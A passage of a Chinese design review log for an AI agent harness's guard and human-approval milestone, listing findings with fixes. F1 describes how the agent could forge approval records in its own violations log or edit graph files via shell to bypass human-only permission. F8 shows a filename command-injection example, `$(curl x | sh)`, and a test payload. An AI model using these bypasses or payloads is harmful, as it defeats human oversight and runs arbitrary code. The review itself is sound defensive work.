# M4 设计评审

评审对象：`.agents/tasks/m4/design.md`。挡路标准：`docs/DEVELOPMENT.md` §1.1（只有验收条件没有满足、不可逆损失没有预防、失败了没有途径发现或恢复或追溯，这三类挡路；其余记为非阻断）。严重度写法：HIGH、MEDIUM 挡路，NIT 不挡路。结论按挡路条数机械判定，写在 `design-review.json`。

| 轮 | 日期 | 评审对象版本 | 挡路 | 非阻断 |
| --- | --- | --- | --- | --- |
| 1 | 2026-10-29 | 0.1 | 8 | 13 |
| 2 | 2026-10-30 | 0.2 | 2 | 13 |
| 3 | 2026-10-30 | 0.3 | 6 | 8 |
| 4 | 2026-10-30 | 0.4 | 4 | 8 |
| 5 | 2026-10-31 | 0.5 | 0 | 9 |

## 第 1 轮（design.md 0.1）

核对范围：设计全文；`src/guard/` 全部文件（`rules.ts`、`index.ts`、`shadow.ts`、`graph-files.ts`、`origin.ts`）；`src/graph/engine.ts`、`tools.ts`、`service.ts`、`stage.ts`、`format.ts` 的相关段；`src/shared/step-notice.ts`、`data-home.ts`、`tool-names.ts`、`health.ts`；`src/workflow/morning-report.ts`、`src/memory/audit.ts`；`reference/dsh-desktop-0.2.1-rc.3/` 下 `dsh-tools`、`dsh-agent-loop`、`dsh-user-questions`、`dsh-client-ui-user-questions`、`dsh-session`、`dsh-session-persistence-jsonl`、`dsh-subagent`、`dsh-working-directory`、`dsh-tool-fs`、`dsh-tool-fs-search`、`dsh-tool-str-replace-editor` 的被引行；M3 设计 0.4（含 §15）、规则板设计 0.4、M7 设计的被引节、阅读摘要 §4、§7、注入清点 §0；图节点 `m4`、`m4-request-card`。只读试验两次：本机 Node v22.20.0 在内存里对两个拼接的 zstd 帧调 `zlib.zstdDecompressSync`；本仓库里用 `git ls-files --exclude` 比较两种忽略行写法。没有读 `~/.dsh` 下的会话日志，设计里的本机实测数字没有复现。

### 发现

#### F1 HIGH 放行可以由模型自己写进违规流水

位置：§5.3 第 3、4 条；§5.5「匹配」与「一次」；§11 不可逆表「LLM 自己批准自己的申报」一行；§12「放行只来自人」。

问题：内存里没有放行时，§5.5 去违规流水里找：没有图时认「带人回答的 `RequestRecord`」，有图时用流水里有没有 `GrantRecord` 判断放行是否已用。违规流水是 `<项目目录>/audit/violations.jsonl`，项目目录是工作区的 `.llm`（`src/shared/data-home.ts`），在圈禁根之内；`write`、`edit` 写它不被任何规则拦。签名的算法在 §5.5 写明（原生工具名加规范化参数的 SHA-256 前 16 位），模型能自己算。所以模型可以追加一行带 `ref` 的拒绝记录和一行 `{outcome: 'approved', by: 'human', via: 'card', …}` 的 `RequestRecord`，再原样调用工作区外的写入，guard 放行。删掉一行 `GrantRecord` 也能让用过的放行在进程重启后再用一次。§11 写的「模型写不出」只对 user-questions 的应答链成立，对流水不成立。`m4-request-card` 建议验收第 3 条（放行只来自人）因此不满足。

改法：流水只作留痕，不作授权来源。

1. 放行只有两个来源：`request_exception` 在 `ask` 返回之后写进内存的放行；图上的申报待决，且拍板的历史条目 `actor` 为 `human`。
2. 「已用」的持久记录放在图上：放行被消耗后，harness 以 `harness` 身份在申报待决上批注 `已用：<callId> <时刻>`；图上的匹配要求没有这条批注。`GrantRecord` 照写，只供追溯。
3. 没有图时，进程重启就丢掉放行：被拒的调用拿到新编号，agent 再申报一次，人再点一次。删去 §5.5「没有图就查违规流水里带人回答的 `RequestRecord`」与「再查违规流水里这个编号有没有 `GrantRecord`」两句，§11「放行：消耗」一行随之改写。
4. 重启之后编号是否存在仍可以从流水里查（伪造一个编号只会让人多看到一张卡）。
5. L2 加一例：向流水追加伪造的 `RequestRecord` 并模拟重启，同一个工作区外的写入仍被拒。
6. §11 写明剩余风险：shell 用 `node -e` 一类读法看不见的方式改图节点文件，不在 `graph-files-only` 的拦截范围内（既有的已知边界，影子兜底会记下），这条路径同样可以伪造图上的拍板。

挡路依据：验收条件没有满足（授权只认人）。

#### F2 HIGH D3 建立在客户端不会有的行为上

位置：§5.4 第一条；§17 D3；§13.4 L4 第 1 项；§0 末段。

问题：rc.3 客户端只在第一个选项的说法以 `(Recommended)` 或 `（推荐）` 结尾时预选它（`dsh-client-ui-user-questions` client.js:683–686 `recommendedFirstOption` 只看 `options[0]`，:788–790 用它生成初稿）。设计按 `d-recommend-last` 把推荐项排在最后，§5.6 的申报待决用同一组选项与推荐，引擎的 `questionRefusal`（`src/graph/engine.ts`:289–301）拒收推荐项不在最后的待决。所以推荐项永远不会被预选，初稿没有选中项。D3 的两个选项都假定有一项预先选中；要做到其中任何一个，都得把那一项排第一并加后缀，这违反 `d-recommend-last`，申报待决也会被引擎拒收。人被问到一件系统不会发生的事，L4 第 1 项「默认选中项符合 D3」也无从核对。§5.4 引 M3 §3.5.1 作依据，那一节写的仍是「推荐项排第一并加 `(Recommended)`」，与 `d-recommend-last` 不一致（注入清点 §5 第 2 条已记）。

改法：

1. 删去 D3，改记进 §16 作 agent 定的事项：选项依次为 `A 放行这一次`、`B 不放行（推荐）`，推荐在最后，不预选，人必须点其中一项。
2. §5.4 第一条改写为客户端的实际规则并给出上面的行号；版面依据改引 `d-recommend-last`，不引 M3 §3.5.1。
3. L4 第 1 项改为核对「初稿没有选中项，「推荐」标在「不放行」上」。没有选中项时直接按回车是什么结果，标〔未核实〕，作为 L4 的一项看。
4. 想要「不细看就按回车即不放行」的效果，在 `d-recommend-last` 之下做不到，§16 写明这一点。

挡路依据：验收条件没有满足（L4 第 1 项无法核对），且一项给人的决定建立在错误的宿主事实上。

#### F3 MEDIUM 写进 `.git/info/exclude` 的那一行不忽略任何东西

位置：§7.3「git 忽略」；§1.2 `m4-env` 建议验收第 2 条；§14.1 `env-notice`。

问题：gitignore 的 `#` 只在行首才是注释，行尾不能写注释。`/.llm/  # dsh-hourness scratch area, added <日期>` 整行是一个模式，匹配不到 `.llm/`。本仓库里实测：`git ls-files --others --ignored --directory --exclude="/.llm/  # dsh-hourness scratch area, added 2026-10-29"` 列不出 `.llm/`，`--exclude="/.llm/"` 列得出。结果是行健康写「已把 /.llm/ 写进 .git/info/exclude」而实际没有忽略；进程每重启一次，`check-ignore` 仍然失败，又追加一行。草稿区的脚本、`.llm/requests/` 里工作区外文件的备份、审计流水都还可能被提交。验收第 2 条不满足，失败没有途径发现。

改法：

1. 追加两行：`# dsh-hourness scratch area, added <日期>`，然后 `/.llm/`。
2. 追加之前先看文件里是否已有恰为 `/.llm/` 的一行，有就不追加。
3. 追加之后再跑一次 `git check-ignore -q .llm/scratch/x`；仍未忽略时行健康降级，写「写了 /.llm/ 但仍未被忽略：<原因>」。
4. `env-notice` 探针改为核对 `git check-ignore` 的退出码为 0，不核对行的文字；L2 用真实的临时 git 仓库测一遍。

挡路依据：验收条件没有满足；失败没有途径发现。

#### F4 MEDIUM 新记录让晨报把跟进、申报、放行算成违规

位置：§3.2、§3.3、§5.8 的新记录；§3.10；第 G2、G4 步。现有代码 `src/workflow/morning-report.ts`:38–39。

问题：今天的晨报把「没有 `mode` 字段」的记录算拒绝，`mode === 'shadow'` 的算影子。M4 往同一份流水里加 `FollowupRecord`、`RequestRecord`、`GrantRecord`，都没有 `mode`；`FollowupRecord` 与 `GrantRecord` 带 `rule`，会被算成「违规 <规则> × n」。规则板的拒绝记录带 `mode: 'enforce'`（规则板 §10.5），今天两节都不收它；§2.3 说 M4 的统计照样处理它，但没有写怎样分类。M7 的 `ladderProposals` 也读这份流水。人看到的数是错的，没有任何检查会发现。

改法：在 `src/guard/records.ts` 定义唯一的分类函数，晨报、`ruleStats`、命令行都用它：

```ts
export type RecordClass = 'denial' | 'rule-shadow' | 'fallback-shadow' | 'followup' | 'request' | 'grant' | 'unknown'
/** kind present: that kind; mode 'shadow' with paths: fallback-shadow; mode 'shadow' otherwise: rule-shadow (rules board included);
 *  no mode, or mode 'enforce': denial; anything else: unknown (counted and reported as unreadable lines). */
export function classifyRecord(line: Record<string, unknown>): RecordClass
```

G2 同一步改晨报的两处过滤并加测试：一条 `FollowupRecord` 与一条 `GrantRecord` 不增加「违规」计数；一条 `mode: 'enforce'` 的规则板记录算拒绝。§2.3 给 M7 一行：周报阶梯读流水时用 `classifyRecord`。也可以把跟进、申报、放行写进另一份文件 `audit/guard-events.jsonl`，二选一写定。

挡路依据：失败没有途径发现（给人看的数字静默出错）。

#### F5 MEDIUM 外层监听器拒绝的调用，guard 看不见，跟进记录判错

位置：§3.3「别的行判出的拦截」；§1.2 `m4-shadow` 建议验收第 2 条。

问题：`graph-files-only` 以 `prepend: true` 装在 guard 行之外（`src/guard/graph-files.ts` `installGraphFileGuard`），M3 的两条规则同样是 `prepend`。外层拒绝时不调 `next()`，guard 行的监听器收不到这次调用。设计只在 guard 行判跟进，于是：拦截之后，下一次调用若又被外层拒绝（图文件写入的原样重试正是这种），guard 看不到它，跟进记录改由更后面的某次调用来判，`repeat` 漏记，「走对」的比例偏高；guard 自己的拦截之后紧跟一次被外层拒绝的调用，也一样。验收第 2 条「下一次根调用留下一条跟进记录」不满足。

改法：`src/guard/followup.ts` 的共用记录器导出 `observe(agent, call, callId)` 与 `noteDenial(…)`。每个用 guard 框架的监听器（guard 行、`installGraphFileGuard`、M3 的 `installMainAgentRules`、M7 的规则）对根调用先调 `observe`，再做自己的判定；同一个 `callId` 只由第一个调用 `observe` 的监听器结算，之后的调用不做事。L2 加一例：连续两次写图文件被 `graph-files-only` 拒绝，留下一条 `outcome: 'repeat'` 的跟进记录。

挡路依据：验收条件没有满足。

#### F6 MEDIUM 别的行里的影子规则不留任何记录

位置：§3.1（保留 `evaluate`）；§2.3 第一行；§12 第一条不变量。

问题：`evaluate` 改为只返回 `judge` 的 `deny`。别的行用 `evaluate` 装自己的监听器（今天的 `graph-files.ts`，M3、M7 的规则按设计也这样做）时，影子规则判为拒绝只得到 `allow`，不写记录。§2.3 写 M7 的五条写入规则用同一个 `mode` 字段、开工时自己定模式；`docs/CHARTER.md` §6 要求新门禁先影子，所以 M7 的规则多半就是装在 M7 行里的影子规则，它们的判定会悄无声息地消失，看上去和「一次也没命中」一样。简报要的「新门禁通用的影子机制」只在 guard 行里成立。

改法：在 `src/guard/gate.ts` 加唯一的安装函数，所有用 guard 框架的行都经它装监听器：

```ts
export function installRuleGate(ctx: PreExecuteHost & ServiceLookup, options: {
  readonly row: string
  readonly rules: (payload: ToolExecutionPayload) => readonly GuardRule[] | undefined
  readonly journal: (record: GuardRecord) => void
  readonly prepend?: boolean
}): () => void
```

它依次做：跟进的 `observe`（F5）、`judge`、拒绝记录、`next()` 放行之后的影子记录、判定器出错进行健康。G1 把 `graph-files.ts` 改用它（行为不变）。`evaluate` 删除，或者写明只用于生效规则、在测试里收到影子规则就抛错。契约测试：目录里所在行不是 `guard` 的规则，都经 `installRuleGate` 安装（目录已有所在行一栏）。

挡路依据：失败没有途径发现。

#### F7 MEDIUM 批准与使用之间目标变了，覆盖时不备份

位置：§5.4「代价一格」；§5.5「备份」；§11 不可逆表第一行。

问题：备份的条件是「目标存在、不大于 10 MiB、且卡上写了备份」。放行在 30 分钟内有效，这期间目标可能变化：人或别的进程新建了这个文件，或者文件涨过 10 MiB。卡上写「新建文件」而使用时文件已存在，就被整个覆盖、没有备份；卡上答应了备份而文件已大于 10 MiB，也不备份。人批的是卡上的事实，覆盖却发生在另一组事实上，损失不可逆。

改法：放行里存下卡上展示的事实（存在与否、大小、修改时间）。使用时重新 `stat`：与卡上相同就照常执行，目标存在且不大于 10 MiB 时一律先备份，不看卡上写了什么；不同就拒绝这次调用，纠偏写「the target changed since the human approved (<变了什么>); call request_exception again」，放行作废，流水写一条 `{kind: 'grant-void', ref, reason}` 留痕。L2 加一例：批准之后、使用之前新建目标文件，调用被拒、文件内容不变。

挡路依据：不可逆损失没有预防。

#### F8 MEDIUM POSIX shell 下文件名可以注入命令

位置：§6.3「路径里有 … 时」；§11 不可逆表「检查命令执行任意命令」一行。

问题：`{files}` 里的路径加双引号，只排除 `"`、`%`、`!`、`^` 与换行，再以 `shell: true` 运行。Windows 的 cmd.exe 下这够了；POSIX 的 `/bin/sh` 在双引号里照样展开 `$(…)`、反引号、`$变量` 与 `\`。文件名来自模型的写入调用：`src/$(curl x | sh).ts` 是 guard 放行的工作区内写入，之后 harness 跑检查时执行了这段替换，不经任何工具调用，没有 guard 判定，不进会话日志，也不进违规流水。§6.3 明写支持其他平台（对进程组发 `SIGKILL`），§11 的防线在那里不成立。

改法：按平台加引号。POSIX 用单引号，路径里的 `'` 换成 `'\''`；Windows 保持双引号与现在的排除表。每个检查日志的第一行写展开之后的完整命令。L2：POSIX 上路径含 `$(echo pwned > x)` 时不产生 `x`；Windows 上含 `%` 的路径被跳过并写进提醒。

挡路依据：对外的动作与不可逆损失没有预防，事后也查不到（命令不在会话日志里）。

#### N1 NIT 推出改动文件时要先换算别名

位置：§6.2。GLM 会话历史里的工具调用块记的是模型调用的名字（`Write`、`Edit`），设计只列了原生名 `write`、`edit`、`str_replace_editor`。照字面实现时，GLM 会话永远不跑检查（L4 第 4 项会发现）。改法：每个调用块的名字先经 `toNativeTool(dialectService(ctx), name)` 换算；`env-checks` 探针在 GLM 与 DeepSeek 两条路由上各跑一遍。

#### N2 NIT ESLint 的过期压制会让检查连续失败

位置：§6.1 本仓库的 ESLint 检查行。ESLint 10 的命令行带压制文件时，被检查文件里某条压制已经用不上（agent 修好了一条被压制的告警）会报错退出〔推断，没有运行〕；按 §6.5 这算失败，连续 3 次后本会话不再跑 ESLint。改法：检查行加 `--pass-on-unpruned-suppressions`，过期压制交给 `npm run lint` 的棘轮。

#### N3 NIT `src/guard/` 导入 `src/design/` 与 M3 定下的依赖方向相反

位置：§2.2 申报一行；第 G4 步。`src/guard/request.ts` 要用 `src/design/cards.ts` 与 `human-writes.ts`；M3 设计 0.4 R2-L7 定的是「`src/guard/` 不导入 `src/design/`」。改法二选一并写明：把卡片构造与以人的身份写图的函数挪到 `src/shared/` 或 `src/graph/`，两边都导入；或者由设计行把这两个函数注入 guard 行（M3 的做法），同时写明设计行禁用时 `request_exception` 返回 `unavailable`。

#### N4 NIT 拒绝文案的修复可以先于申报通道落地

位置：§5.2；第 G1、G4 步。注入清点 §0 的缺陷要等 G4，而 G4 等 M3 第 4–6 步。改法：G1 先删 `APPLICATION_PROTOCOL`，圈禁的例外先用第三种情形那句（「This session has no request channel: stop and ask the human in your reply …」），file-tools-only 的例外换成新文案；G4 再加编号与前两种情形。

#### N5 NIT `PROMOTION` 与 M7 §3.12.2 只是数字相同

位置：§3.5、§2.3。M4 的判据是「带标注的会拦样本（含回放）至少 20 条、实时影子从第一条记录起至少 14 天、误伤为 0」；M7 §3.12.2 是「近 14 天影子记录不少于 20 条，且人没有标过误判」。数字相同，含义不同，§3.5 的「相同」不准确。改法：§3.5 写明两者的差别，§18 第 5 条写明 M7 那一行改为 M4 的含义。

#### N6 NIT 规则板页面的误判数从哪来

位置：§2.3「人写的规则」一行；§18 第 5 条。规则板 §5.5 写规则页显示「人在影子记录上标过的误判数」，另有 `hits.json`。改法：写明规则页的误判数取 `ruleStats` 对 `labels.jsonl` 的结果，规则板不另存标注；`hits.json` 只是命中计数。把这句加进 §18 第 5 条给 `rules` 的批注。

#### N7 NIT E4 依赖 G3 的标记表，先后表里没写

位置：§13.2、§13.3。E4 用 `src/guard/suppression.ts`（G3 新建）导出的 `SUPPRESSION_MARKERS`。改法：§13.3 加一行「E4 在 G3 之后」，或者把标记表放进 `src/shared/`，两条线都导入。

#### N8 NIT 主 Agent 拿到 `approved` 之后写不了

位置：§5.3 输出的 `message`；§5.5「子 agent」。`/wish` 会话里主 Agent 被 `main-agent-no-write` 拦着，「Resubmit exactly the same call now」对它走不通。改法：`approved` 的说明加一句「if you cannot write (main agent), dispatch a subagent that makes this identical call; the approval covers the whole dispatch chain」。

#### N9 NIT 拒绝文案里写出 `request_exception` 的字段名

位置：§5.2 第一种情形；§5.3。GLM 上这个工具是延迟的，schema 不收多余字段，拒绝文案只用散文描述三项内容。改法：文案写成 `call request_exception {"ref": "<ref>", "purpose": …, "reversibility": …, "alternatives": …}`，第一次调用不必先检索定义。

#### N10 NIT 「第三次修复」的计数前后不一

位置：§4.6；§1.2 `m4-rules` 建议验收第 2 条。`docs/ORCHESTRATION.md` §2.4 写「第三次修复」，触发条件是「第 3 次重开」，卡上写「前两次修复没修住」；重开 3 次时已经有 3 次完成没修住。改法：选一种数法，让触发条件、标题、「取决于」一句与验收第 2 条一致。

#### N11 NIT 一个放行会盖掉同一行里别的生效拒绝

位置：§3.1 `Judgement.deny`；§3.2 第 4 步。`deny` 只留第一个生效拒绝，圈禁的放行把这次调用当作没有拒绝。`checker-config` 转生效并进入可申报名单之后，工作区外的一个检查器配置文件会同时被两条规则拒绝，圈禁的放行把另一条也放了。改法：`Judgement` 保留全部生效拒绝（`denies`），放行只去掉它自己那条规则的拒绝。

#### N12 NIT 回放要拆开 `DeferredToolCall`

位置：§3.6。会话历史里记的是模型发出的 `DeferredToolCall`（`docs/DESIGN.md` §5.5、§5.10），目标在参数 `{name, input}` 里。改法：回放先拆开再判定，`summary.json` 里计拆开的条数。

#### N13 NIT 删除前把脚本里的地址留下来

位置：§8。三个脚本是未跟踪文件，提交信息里的 SHA-256 只能核对身份，留不下内容；三个脚本里共有 17 处地址字面量。改法：把这些地址写进 `docs/reference/bigmodel-guide-digest.md` 的「附」，「能从快照文件名还原」这句话在删除之后仍可核对。

### 已核实的假设

- `tools/pre-execute` 瀑布与拒绝：tools:3320–3321 跑瀑布，`deny` 的理由变成 `Error: <理由>` 的错误结果、工具体不执行（:3337–3353）；`ask` 交给 `serviceAsk`（:3322）。
- `exec` 的字段：`callId`、`name`、`agent`、`parent`、`signal`，`arguments` 经快照后深冻结（tools:3229–3263）。
- `tools.register` 校验输出 schema 并保留 `run_code`（tools:2974–2983）；`tools/post-execute` 瀑布可返回 `additionalContexts`（tools:3599–3627）。
- `commitReady` 按模型顺序逐个 await 结果（agent-loop:565–575），§6.2 不用 `tools/post-execute` 的理由成立。
- `tool/call` 的 `{turn, step, callId, name, arguments}`、`tool/result` 的 `{turn, step, message}`（agent-loop:681–702）；`request/header` 的写入（agent-loop:1224–1240）；`agent/pre-step` 瀑布（agent-loop:902–927）。
- `userQuestions.ask`：空问题 `EMPTY_QUESTIONS`，`assertLiveRoot` 给出 `CALLER_NOT_LIVE` 与 `DELEGATED_CALLER`（user-questions:531–535），没有应答方 `NO_PROVIDER`，按 agent 作用域派发 `user-questions/request`（:668–691）；问题带 `id`、`question`、`detail`、`header`、`options`、`multiSelect`（:33–47）。
- 客户端的预选规则：只看 `options[0]`（client.js:683–686、788–790），推荐标记按说法后缀解析、任何位置都显示「推荐」（:672–681、1090）。设计的说法与此不符，见 F2。
- 会话日志后缀 `.jsonl` 或 `.jsonl.zstd`（session-persistence-jsonl:752–756），:1138 起是逐帧的私有解码器；本机 Node v22.20.0 的 `zstdDecompressSync` 对两帧拼接的数据只解出第一帧（内存试验）。
- 子 agent 的会话头带 `cwd`（取父会话）、`parentSession`、`origin: 'subagent'`、`delegationDepth`（subagent:346–356；session:1818–1827）；`workingDirectory.get`（working-directory:76–78）。
- 文件工具参数：`read`、`write`、`edit`、`read_image` 的 `file_path`，`write` 的 `content`，`edit` 的 `old_string`、`new_string`（tool-fs:251–258、549–561、690–706、986–991）；`grep` 的 `path`（tool-fs-search:1090–1100）；`str_replace_editor` 的 `command` 四个取值与 `path`，`create` 读 `file_text` 且拒绝覆盖已存在的文件（str-replace-editor:140–171、267–284）。
- 代码现状：两条规则的例外都用 `APPLICATION_PROTOCOL`；圈禁只判 `write`、`edit`，`str_replace_editor` 写工作区外今天放行；`evaluate` 第一个拒绝胜出、判定器抛错放行（`src/guard/rules.ts`）。guard 行的监听器不是 `prepend`，图文件门禁是（`src/guard/index.ts`、`graph-files.ts`）；`mention`、`pathKey` 是 `graph-files.ts` 的私有函数；`GuardRecord` 在 `index.ts`，晨报与 `src/memory/audit.ts` 从那里导入。
- 引擎：`TRANSITIONS` 里 `done` 只能到 `doing`（engine.ts:106–113）；`OPEN_PARENT_TYPES` 与 `initialStatus`（:100、306–319）；提议可指定 id（:327–332）；`LLM_EDITABLE` 不含 `acceptance`（:97）；推荐必须是最后一个选项（:289–301）。`labeledSections` 在 `src/graph/stage.ts`:61；非目标节点要有父节点（`src/graph/format.ts`:344–348）。
- 凭证文件：`<userHome>/credentials.json`（`src/glm-llm/zcode.ts`、`auth/store.ts`），环境变量 `GLM_HOURNESS_CREDENTIAL_SECRET`（`auth/store.ts`:12）；`userDataHome()` 与 `resolveDshHome()` 在 `src/shared/data-home.ts`。
- `HOURNESS_ROWS` 今天没有 `env`；`ORCHESTRATION_RESIDENT_TOOLS` 逐个列名；晨报以「没有 `mode`」判拒绝（morning-report.ts:38–39）。
- 本仓库的 `.gitignore` 第 3 行是 `.llm/`；`.llm/docs/` 下三个脚本的大小与设计相同，`_bigmodel_md/` 有 47 个文件；`scripts/check-lint.mjs` 用 `eslint-suppressions.json`；ESLint 精确版本 10.13.0。
- 图节点 `m4-request-card` 的正文与依赖（`m3-5`、`split`，来源 `question-24`）与设计 §1.1 的引述一致。

### 没有核实或说法有误的假设

- 有误：客户端预选推荐项（§5.4）。只有排第一且带后缀的选项才预选，见 F2。
- 有误：`.git/info/exclude` 里带行尾注释的那一行能忽略 `.llm/`（§7.3），见 F3。
- 有误：「路径参数经字符检查后加引号」能防止检查命令执行任意命令（§11），POSIX 下不成立，见 F8。
- 有误：放行「模型写不出」（§11、§12），经违规流水可以写，见 F1。
- 不准确：`PROMOTION` 与 M7 §3.12.2「相同」（§3.5），见 N5。
- 没有复现：§3.6 与 D2 的本机实测数字（719 个日志、1,004 次 shell 调用、115 次会拦、36 次提到凭证）与 §6.1 的耗时；本评审没有读 `~/.dsh`。
- 没有核实：ESLint 10 在过期压制时的退出行为（N2）；GLM 的 `DeferredToolCall` 能否不先检索就调用一个延迟工具（N9）；`session:1517–1536` 一段里 `turn/start` 的数据形状（评审只看到 :1517 是 `append`；现有 `shadow.ts` 已按 `data.turn` 使用，作为既有用法接受）。
- 依赖尚未合入：`dispatchRoot`、`focusOf`、`src/design/cards.ts`、`human-writes.ts`、`src/graph/digest-notice.ts` 都在 M3 的后续步骤里，今天的 main 上没有；设计已把 G4、E2 的开工条件写成等这些步骤合入。
- 设计的依据写 main `6a6895e`，main 现在是 `e1a82e2`（其后有 split L4 与 glm-ui 的提交）；实现开工时按新的 main 重核行号。

## 第 2 轮（design.md 0.2）

核对范围：0.2 全文与它的 §19.1；`src/guard/` 全部文件（与第 1 轮相同，main `f47629c` 相对设计依据 `eb614ab` 在 `src`、`tests`、`scripts`、`packages` 下没有改动）；`src/graph/engine.ts`（权限、`TRANSITIONS`、`planPropose`、`planChange`、`planStatus`、`planEdit`、`questionRefusal`）、`schema.ts`（`ACTORS`、`CARD_LIMITS`、`NODE_TYPES`）、`service.ts`、`tools.ts`（`writeTool`、`WRITE_OUTPUT`）；`src/toolsearch/index.ts`；`src/shared/step-notice.ts`；`src/workflow/morning-report.ts`；`scripts/check-lint.mjs`；`node_modules/eslint/lib/cli.js` 与 `options.js`；`reference/dsh-desktop-0.2.1-rc.3/` 下 `dsh-client-ui-user-questions` client.js:665–960、`dsh-agent-loop` 与 `dsh-session` 的 `turn/start`、`turn/end`；`.llm/docs/` 三个脚本的地址字面量；本仓库 `.llm/audit/violations.jsonl` 的 4 条记录；`.agents/tasks/design-context.md`（2026-10-30 00:14 版）、M3 设计 0.4 §3.5.1 与 M3 附录 0.2（2026-10-30）、规则板设计 0.4.1、M7 设计 §3.12.2。

### 第 1 轮发现的状态

| 发现 | 状态 | 核对 |
| --- | --- | --- |
| F1 HIGH 放行可由模型写进违规流水 | 关闭 | §5.5 只认内存放行与图上 `harness` 提议、`human` 拍板的待决；匹配读 `propose` 历史的 `reason`（引擎在 engine.ts:450 写入，模型改不了）；`relay` 的拍板记为 `actor: 'llm'`（engine.ts:150–154、236–238），不发放行；M3 的 `decision_card` 以 `llm` 提议、`reason` 固定（M3 §3.5.1 第 3 步），造不出 `harness` 提议的申报待决。剩余风险已写进 §11；那一句的发现方式不准，见 N18 |
| F2 HIGH D3 建立在客户端不会有的行为上 | 关闭 | 实读 client.js:683–686、783–795、924–931，与 §5.4、H9a 一致；D3 删去，§16 记为 agent 定 |
| F3 MEDIUM exclude 那一行不忽略任何东西 | 关闭 | §7.3 注释单独一行、去重、复核、降级；L2 用真实临时仓库 |
| F4 MEDIUM 新记录让晨报算错违规 | 关闭 | `classifyRecord` 定义清楚，规则板 0.4.1 的记录（`mode: 'enforce' \| 'shadow'`，没有 `kind`）按它分类正确；`RequestRecord` 的字段没写全，见 N14 |
| F5 MEDIUM 外层拒绝的调用 guard 看不见 | 关闭 | `observe` 由 `installRuleGate` 第 3 步调用、按 `callId` 去重；`guard-followup` 场景能证明各行共用一个记录器。GLM 延迟调用的包装另有问题，见 F9 |
| F6 MEDIUM 别的行里的影子规则不留记录 | 关闭 | `evaluate` 删除，`installRuleGate` 唯一，契约测试按安装标记核对 |
| F7 MEDIUM 批准与使用之间目标变了 | 关闭 | 放行带卡上的事实，使用时重新 `stat`，不同即拒绝并作废，相同且存在就备份；备份失败拒绝 |
| F8 MEDIUM POSIX 下文件名可以注入命令 | 关闭 | `quoteForShell` 按平台，日志第一行记展开后的命令，L2 两个平台都测 |
| N1–N13 | 全部关闭 | N2 的 ESLint 行为已实读（cli.js:495–505：不带 `--pass-on-unpruned-suppressions` 时退出码 2）；N9 的 `DeferredToolCall` 不要求先检索已实读（toolsearch index.ts:155–166）；N13 的字面量与三个脚本逐字一致 |

### 发现

#### F9 MEDIUM GLM 上延迟工具的包装调用替模型结算了跟进

位置：§3.3（`observe`、`followupOf`、各规则的 `rightPath`）；§1.2 `m4-shadow` 建议验收第 2 条；§13.1 G2；§14.4 K1。

问题：GLM 上 `request_exception` 是延迟工具（§5.3），模型经 `DeferredToolCall {name, input}` 调用。`src/toolsearch/index.ts`:155–175 里，包装调用本身是一次没有 `parent` 的根调用，先过 `tools/pre-execute`；它的工具体再以 `callId: '<id>:deferred'`、同样没有 `parent` 的第二次根调用执行目标（文件头 :15–19 写明这是有意的）。按 §3.3，包装调用先到 `installRuleGate` 第 3 步，`observe` 用它结算拦截之后的待判：名字是 `DeferredToolCall`，不等于被拒的 `write`，圈禁的 `rightPath`（「`request_exception` 带这次的编号」）也不成立，于是记为 `other`；之后真正的 `request_exception` 已无待判可结算。结果是 GLM 路由上圈禁拦截之后走对申报通道的每一次都记成「别的」；被拒的延迟工具调用（例如经包装的 `str_replace_editor`）原样重试也记不成 `repeat`。这些数进晨报「拦截后下一步走对」、`stats` 与转生效卡片，K1 在 GLM-5.3 上量的正是这个比例。没有任何检查会发现：`guard-followup` 场景只用常驻工具，`guard-request` 场景不核对跟进记录。§3.6 与 §6.2 已经拆包，§3.3 没有。

改法：

1. `observe` 先拆包：调用名（经 `toNativeTool`）是 `DeferredToolCall` 且参数是 `{name: string, input: object}` 时，用 `{name: toNativeTool(dialect, name), arguments: input}` 结算待判，并把 `<callId>` 与 `<callId>:deferred` 一起记为已结算；参数形状不对时按原样结算。
2. 同一处拆包也用于 `noteDenial` 的「参数摘要」比较（被拒的是内层调用，重试的外层要拆开才比得上）。
3. L2 加两例：GLM 路由上圈禁拒绝之后，`DeferredToolCall {name: 'request_exception', input: {ref: <这次的编号>, …}}` 留下恰好一条 `right-path`；经包装的 `str_replace_editor` 被拒之后原样再发一次包装调用，留下 `repeat`。
4. `guard-request` 场景在 GLM 一遍里核对跟进记录为 `right-path`。

挡路依据：给人看的数静默出错（失败没有途径发现）；验收第 2 条在 GLM 路由上不满足。

#### F10 MEDIUM 给人的问题没有前因后果，用了换词表里的词

位置：§17 D1、D2；§5.4 申报卡的 `detail`；§4.6 第三次修复的待决。

问题：`.agents/tasks/design-context.md`（2026-10-30 00:14 版，早于本设计 0.2）记了人的两条定案，简报要求每份设计遵守：

- 「Questions for the person carry their background」（人 2026-10-29：「你每次给问题的时候能不能带上前因后果啊，没头没脑的来一句我不明白啊」）：每个给人的问题（设计里的待定节、卡片、对话）先用两三句白话说清这件事关于系统的哪一块、从哪个决定或发现来、为什么由人定，再放表；不用没解释的内部标签。
- `d-plain-questions`（人 2026-10-30）：给人的问题不用人没学过的词，`验收` 换成「怎样算做完」，`标定` 换成「练习题」，`门禁` 换成「合入前的检查」。

本设计的四处给人的问题都直接从「取决于」开始，没有背景段。D1 的标题是「M4 七个任务的验收条件」，代价一格写「要读 §1.2 的 27 条」；D2 的标题是「G3 误伤与新规则的样本从哪来」，选项里有「实时影子记录」「流水」「回放」，都没有解释。申报卡的 `detail` 第一行是「取决于」，人要读到最后「harness 核对的事实」才知道是哪个会话、为什么被拦；第三次修复的待决正文第一行是 `停下查根因：<节点 id>`，代价一格写「晚一个派发周期」。M3 附录 0.2 已按这两条改了决策卡（`background` 是卡片 `detail` 的第一段，附录 :130、:137），M4 的两张卡与它不一致。这是简报的验收（遵守设计上下文里人定的事项）没有满足。

改法：

1. D1 改为（文字可以再改，结构照此）：

   > ### D1 M4 七件事怎样算做完
   >
   > M4 给 harness 补几样东西：新规则先只记录不拦，写工作区外的文件被拦下之后可以请你逐次批准，每次改完代码自动跑检查并把结果告诉模型，等等，一共七件。每件事「怎样算做完」由你定，agent 只能起草，所以问你。草稿在设计文档里，每件三到六条。
   >
   > 取决于：agent 起草的「怎样算做完」，你愿意先照着做、以后再改吗？

   表的「代价」一格写「要读 27 条，约 3,300 字」，不写节号。
